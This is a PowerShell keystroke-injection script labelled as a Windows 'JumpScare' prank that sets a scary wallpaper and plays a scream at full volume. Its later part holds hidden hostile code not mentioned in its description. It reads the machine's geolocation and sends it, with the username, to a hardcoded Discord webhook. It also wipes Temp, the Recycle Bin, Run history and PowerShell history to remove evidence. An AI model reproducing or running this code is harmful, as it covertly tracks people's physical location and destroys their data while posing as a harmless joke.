############################################################################################################################################################                      
#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
# Title        : JumpScare         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
# Version      : 1.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
# Category     : Prank             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
#                                  |   and yea curiosity killed the cat                        ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                                                                                              
#                                  |    but satisfaction brought him back                     (((^_(((/(((_/ #          /     \     /     \                #    
#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
############################################################################################################################################################

<#
.NOTES
	This script can be run as is with the provided execution file
.DESCRIPTION 
	This script will download a scary image and a scream sound effect hosted with this payload and host volume will be raised to max level
	Upon running this script it will immediately pause after the downloads until a mouse movement is detected 
	The capslock button will be pressed every 3 seconds to prevent sleep, and act as an indicator the payload is ready 
	After a mouse movement is detected their wallpaper will change to the scary image provided and the scream sound effect will play
#>

############################################################################################################################################################

# Download Image; replace link to $image to add your own image

$image =  "https://github.com/quazi00/jumpscare/blob/main/maxresdefault.png"

$i = -join($image,"?dl=1")
iwr $i -O $env:TMP\i.png

iwr https://raw.githubusercontent.com/quazi00/jumpscare/main/maxresdefault.png?dl=1 -O $env:TMP\i.png

# Download WAV file; replace link to $wav to add your own sound

$wav = "https://github.com/quazi00/jumpscare/blob/main/we_found_you_long.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav



#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This will take the image you downloaded and set it as the targets wall paper
#>

Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}
 
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------
<#

.NOTES 
	This is to play the WAV file
#>

function Play-WAV{
$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
}

#----------------------------------------------------------------------------------------------------

# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

#----------------------------------------------------------------------------------------------------

Pause-Script
Set-WallPaper -Image "$env:TMP\i.png" -Style Center
Play-WAV

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		$GL = $GL -split " "
		$Lat = $GL[0].Substring(11) -replace ".$"
		$Lon = $GL[1].Substring(10) -replace ".$" 
		return $Lat, $Lon


	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

$Lat, $Lon = Get-GeoLocation
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1057897311352651776/7aYUDB622-JEg-4Qj35BIvjiBreHeChmtZaoSjJfhZy-GbEi4DeKxrM2a56WznQQ4Bjc'

$Body = @{
  'username' = $env:username
  'content' = $text  
  
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

upload-Discord -text "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
